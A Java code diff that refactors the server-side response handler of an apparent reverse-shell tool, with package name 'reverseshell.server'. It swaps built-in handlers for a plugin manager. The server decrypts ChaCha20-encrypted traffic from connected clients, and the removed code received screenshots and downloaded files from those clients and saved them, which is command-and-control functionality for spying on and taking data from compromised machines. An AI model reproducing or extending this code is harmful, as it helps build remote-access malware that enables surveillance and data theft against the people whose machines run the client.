@@ -7,26 +7,24 @@ import java.net.Socket;
 import java.util.logging.Level;
 import java.util.logging.Logger;
 import obs1d1anc1ph3r.reverseshell.server.encryption.ChaCha20;
+import obs1d1anc1ph3r.reverseshell.server.plugins.CommandPlugin;
+import obs1d1anc1ph3r.reverseshell.server.plugins.PluginManager;
 
 public class ResponseHandler implements Runnable {
 
 	private final DataInputStream dataIn;
 	private final DataOutputStream dataOut;
 	private final Socket clientSocket;
-	private final ReceiveScreenShot screenshotHandler;
-	private final FileSaver fileSaver;
 	private final byte[] encryptionKey;
+	private final PluginManager pluginManager;
 
-	//This class should probably be refactored and do a bit less
-	//ToDo -- Refactor the class by creating a plugin manager for the server side, basically do the same thing as you did with the client
-	public ResponseHandler(DataInputStream dataIn, DataOutputStream dataOut, Socket clientSocket, byte[] encryptionKey, byte[] nonce) {
+	//I've refactored it like a good little programmer, maybe someone will be proud of me now
+	public ResponseHandler(DataInputStream dataIn, DataOutputStream dataOut, Socket clientSocket, byte[] encryptionKey) {
 		this.dataIn = dataIn;
 		this.dataOut = dataOut;
 		this.clientSocket = clientSocket;
-		this.screenshotHandler = new ReceiveScreenShot();
-		this.fileSaver = new FileSaver();
 		this.encryptionKey = encryptionKey;
-
+		this.pluginManager = new PluginManager();
 	}
 
 	@Override
@@ -47,10 +45,9 @@ public class ResponseHandler implements Runnable {
 				byte[] decryptedData = ChaCha20.decrypt(encryptionKey, receivedNonce, encryptedData); //Decrypt the data
 				String response = new String(decryptedData); //Get the response from the decrypted data
 
-				if (response.equalsIgnoreCase("screenshot")) { //I should really make these plugin based like the client, that's the best way to refactor this class, I'll do that later
-					handleScreenshot();
-				} else if (response.equalsIgnoreCase("file download")) { //Same thing as the above comment
-					handleFileDownload();
+				CommandPlugin plugin = pluginManager.getPlugin(response);
+				if (plugin != null) {
+					plugin.execute(dataIn, dataOut, encryptionKey, clientSocket);
 				} else {
 					processResponse(response); //Normal responses
 				}
@@ -66,60 +63,6 @@ public class ResponseHandler implements Runnable {
 		} finally {
 			closeResources();
 			System.out.println("[*] ResponseHandler thread exiting.");
-		}
-	}
-
-	private void handleScreenshot() { //Refactor
-    try {
-        int length = dataIn.readInt();
-        if (length <= 12) {
-            System.err.println("[ERROR] Invalid screenshot data length.");
-            return;
-        }
-
-        byte[] receivedNonce = new byte[12];
-        dataIn.readFully(receivedNonce);
-
-        byte[] encryptedImageBytes = new byte[length - 12];
-        dataIn.readFully(encryptedImageBytes);
-
-        byte[] imageBytes = ChaCha20.decrypt(encryptionKey, receivedNonce, encryptedImageBytes);
-
-        screenshotHandler.receiveScreenshotData(imageBytes);
-    } catch (IOException e) {
-        System.err.println("[ERROR] Error while receiving screenshot data: " + e.getMessage());
-    } catch (Exception ex) {
-        Logger.getLogger(ResponseHandler.class.getName()).log(Level.SEVERE, null, ex);
-    }
-}
-
-
-	private void handleFileDownload() { //Refactor
-		try {
-			String fileName = dataIn.readUTF();
-			int nonceLength = dataIn.readInt();
-
-			if (nonceLength <= 0 || nonceLength > 32) {
-				throw new IOException("Invalid nonce length: " + nonceLength);
-			}
-			byte[] receivedNonce = new byte[nonceLength];
-			dataIn.readFully(receivedNonce);
-
-			int fileLength = dataIn.readInt();
-			if (fileLength <= 0) {
-				throw new IOException("Invalid file length received: " + fileLength);
-			}
-
-			byte[] encryptedFileBytes = new byte[fileLength];
-			dataIn.readFully(encryptedFileBytes);
-
-			byte[] fileBytes = ChaCha20.decrypt(encryptionKey, receivedNonce, encryptedFileBytes);
-
-			fileSaver.saveFile(fileBytes, clientSocket, fileName);
-		} catch (IOException e) {
-			System.err.println("[ERROR] File transfer failed: " + e.getMessage());
-		} catch (Exception ex) {
-			Logger.getLogger(ResponseHandler.class.getName()).log(Level.SEVERE, null, ex);
 		}
 	}
 
